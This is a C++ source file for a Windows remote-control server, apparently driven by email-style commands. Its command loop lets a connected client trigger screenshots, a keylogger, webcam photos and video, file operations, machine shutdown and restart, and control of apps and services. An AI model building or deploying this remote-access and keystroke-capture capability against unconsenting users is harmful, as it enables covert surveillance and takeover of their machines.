#include "server.h"

// Function to get the active IPv4 address of the machine
string Server::getActiveIPv4Address() {
	ULONG outBufLen = 0;
	GetAdaptersInfo(NULL, &outBufLen);

	vector<BYTE> buffer(outBufLen);
	PIP_ADAPTER_INFO pAdapterInfo = reinterpret_cast<PIP_ADAPTER_INFO>(buffer.data());

	if (GetAdaptersInfo(pAdapterInfo, &outBufLen) == NO_ERROR) {
		while (pAdapterInfo) {
			string gateway = pAdapterInfo->GatewayList.IpAddress.String;
			string ipAddress = pAdapterInfo->IpAddressList.IpAddress.String;

			if (!gateway.empty() && gateway != "0.0.0.0") {
				bool validGateway =
					gateway.substr(0, 7) == "192.168" || gateway.substr(0, 3) == "10.";

				bool ipMatchesNetwork =
					(gateway.substr(0, 7) == "192.168" && ipAddress.substr(0, 7) == "192.168") ||
					(gateway.substr(0, 3) == "10." && ipAddress.substr(0, 3) == "10.");

				bool notVirtualInterface =
					strstr(pAdapterInfo->Description, "Virtual") == nullptr &&
					strstr(pAdapterInfo->Description, "VirtualBox") == nullptr &&
					strstr(pAdapterInfo->Description, "VMware") == nullptr;

				if (validGateway && ipMatchesNetwork && notVirtualInterface) {
					return ipAddress;
				}
			}
			pAdapterInfo = pAdapterInfo->Next;
		}
	}

	return "";
}

// Function to handle client communication
void Server::handleClientCommunication() {
	// Initialize threads for different functionalities
	ScreenshotThread screenshotThread(client_socket);
	Files files(client_socket);
	KeyloggerThread keyloggerThread(client_socket);
	WebcamThread webcamThread(client_socket);
	Machine machine(client_socket);
	AppService appService(client_socket);

	char buffer[bufferSize];

	// Loop to receive data from client
	while (isRunning) {
		memset(buffer, 0, bufferSize);

		int bytes_read = recv(client_socket, buffer, bufferSize, 0);
		if (bytes_read <= 0) {
			log("Connection closed by client", ERROR_LOG);
			break;
		}

		string jsonString(buffer);
		json data = json::parse(jsonString);
		log("Received data from client: " + jsonString, INFO_LOG);

		string cmd;
		json params;

		// Handle request for some specific cases
		if (data.contains("cmd")) {
			cmd = data["cmd"];
			params = data["params"];
		}
		else {
			cmd = data["subject"];
			params = convert_body_to_json(data["body"]);
		}

		// Call functions based on request
		if (cmd == "screenshot") {
			screenshotThread.start("single");
		}
		else if (cmd == "screenshotitv") {
			if (params["action"] == "start") {
				screenshotThread.setInterval(stoi(string(params["interval"])));
				screenshotThread.start("multiple");
			}
			else if (params["action"] == "stop") {
				screenshotThread.stop();
			}
		}
		else if (cmd == "keyloggeritv") {
			if (params["action"] == "start") {
				keyloggerThread.start(params);
				cout << "Keylogger started" << endl;
			}
			else if (params["action"] == "stop") {
				keyloggerThread.stop();
			}
		}
		else if (cmd == "webcam") {
			webcamThread.startCapture(params, "single");
		}
		else if (cmd == "webcamitv") {
			if (params["action"] == "start") {
				webcamThread.setInterval(stoi(string(params["interval"])));
				webcamThread.startCapture(params, "multiple");
			}
			else if (params["action"] == "stop") {
				webcamThread.stop();
			}
		}
		else if (cmd == "webcamvideo") {
			if (params["action"] == "start") {
				webcamThread.setInterval(stoi(string(params["interval"])));
				webcamThread.startVideo(params);
			}
			else if (params["action"] == "stop") {
				webcamThread.stop();
			}
		}
		else if (cmd == "createff") {
			string type = params["type"];
			string name = params["name"];

			// Fix the path ending with a missing slash
			string path = add_ending_backslash(params["path"]);

			if (type == "file") {
				json response = files.create_file((path + name).c_str());
				send(client_socket, response.dump().c_str(), bufferSize, 0);
			}
			else if (type == "folder") {
				json response = files.create_folder((path + name).c_str());
				send(client_socket, response.dump().c_str(), bufferSize, 0);
			}
		}
		else if (cmd == "moveff") {
			string type = params["type"];
			string source = add_ending_backslash(params["source"]);
			vector<string> names = split_string(params["names"], ',');
			string destination = add_ending_backslash(params["destination"]);
			json response = {
				{"cmd", "moveff"},
				{"body", {
					{"status", "sending"},
					{"content", {}},
				}}
			};

			if (type == "file") {
				for (auto& name : names) {
					json result = files.move_file((source + name).c_str(), (destination + name).c_str());
					response["body"]["content"].push_back(result);
				}
			}
			else if (type == "folder") {
				for (auto& name : names) {
					json result = files.move_folder((source + name).c_str(), (destination + name).c_str());
					response["body"]["content"].push_back(result);
				}
			}

			response["body"]["status"] = "success";
			send(client_socket, response.dump().c_str(), bufferSize, 0);
		}
		else if (cmd == "copyff") {
			string type = params["type"];
			string source = add_ending_backslash(params["source"]);
			vector<string> names = split_string(params["names"], ',');
			string destination = add_ending_backslash(params["destination"]);
			json response = {
				{"cmd", "copyff"},
				{"body", {
					{"status", "sending"},
					{"content", {}},
				}}
			};

			if (type == "file") {
				for (auto& name : names) {
					json result = files.copy_file((source + name).c_str(), (destination + name).c_str());
					response["body"]["content"].push_back(result);
				}
			}
			else if (type == "folder") {
				for (auto& name : names) {
					json result = files.copy_folder((source + name).c_str(), (destination + name).c_str());
					response["body"]["content"].push_back(result);
				}
			}

			response["body"]["status"] = "success";
			send(client_socket, response.dump().c_str(), bufferSize, 0);
		}
		else if (cmd == "deleteff") {
			string type = params["type"];
			string path = add_ending_backslash(params["path"]);
			vector<string> names = split_string(params["names"], ',');
			json response = {
				{"cmd", "deleteff"},
				{"body", {
					{"status", "sending"},
					{"content", {}},
				}}
			};

			if (type == "file") {
				for (auto& name : names) {
					json result = files.delete_file((path + name).c_str());
					response["body"]["content"].push_back(result);
				}
			}
			else if (type == "folder") {
				for (auto& name : names) {
					json result = files.delete_folder((path + name).c_str());
					response["body"]["content"].push_back(result);
				}
			}

			response["body"]["status"] = "success";
			send(client_socket, response.dump().c_str(), bufferSize, 0);
		}
		else if (cmd == "listff") {
			string path = add_ending_backslash(params["path"]);

			files.list_contents(path.c_str());

		}
		else if (cmd == "saveff") {
			string path = add_ending_backslash(params["path"]);
			string attachment = data["attachment"];

			json response = files.save_attachment(attachment, path);
			send(client_socket, response.dump().c_str(), bufferSize, 0);
		}
		else if (cmd == "getff") {
			vector<string> paths = split_string(params["paths"], ',');

			files.get_files(paths);
		}
		else if (cmd == "shutdown") {
			machine.shutdownDevice(params);
		}
		else if (cmd == "restart") {
			machine.restartDevice(params);
		}
		else if (cmd == "sleep") {
			machine.sleepDevice(params);
		}
		else if (cmd == "listas") {
			appService.list(params);
		}
		else if (cmd == "startas") {
			appService.start(params);
		}
		else if (cmd == "stopas") {
			appService.stop(params);
		}
	}
}

// Function to initialize the server
bool Server::initialize() {
	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
		log("WSAStartup failed with error: " + to_string(WSAGetLastError()), ERROR_LOG);
		return false;
	}

	server_fd = socket(AF_INET, SOCK_STREAM, 0);
	if (server_fd == INVALID_SOCKET) {
		log("Socket creation failed with error: " + to_string(WSAGetLastError()), ERROR_LOG);
		WSACleanup();
		return false;
	}

	// Set the address to bind the socket
	address.sin_family = AF_INET;
	address.sin_port = htons(port);
	address.sin_addr.s_addr = inet_addr(getActiveIPv4Address().c_str());

	return true;
}

// Function to bind the socket
bool Server::bindSocket() {
	if (::bind(server_fd, (struct sockaddr*)&address, sizeof(address)) == SOCKET_ERROR) {
		log("Bind failed with error: " + to_string(WSAGetLastError()), ERROR_LOG);
		closesocket(server_fd);
		WSACleanup();
		return false;
	}
	return true;
}

// Function to listen and accept incoming connections
void Server::listenAndAccept() {
	if (listen(server_fd, 3) == SOCKET_ERROR) {
		log("Listen failed with error: " + to_string(WSAGetLastError()), ERROR_LOG);
		return;
	}

	log("Server is listening on " + string(inet_ntoa(address.sin_addr)) + ":" + to_string(ntohs(address.sin_port)), SUCCESS_LOG);

	client_socket = accept(server_fd, nullptr, nullptr);
	if (client_socket == INVALID_SOCKET) {
		log("Accept failed with error: " + to_string(WSAGetLastError()), ERROR_LOG);
		return;
	}

	log("Connection established with client", SUCCESS_LOG);
	isRunning = true;

	handleClientCommunication();
}

// Function to shutdown the server
void Server::shutdownServer() {
	if (client_socket != INVALID_SOCKET) {
		closesocket(client_socket);
	}
	if (server_fd != INVALID_SOCKET) {
		closesocket(server_fd);
	}
	WSACleanup();
}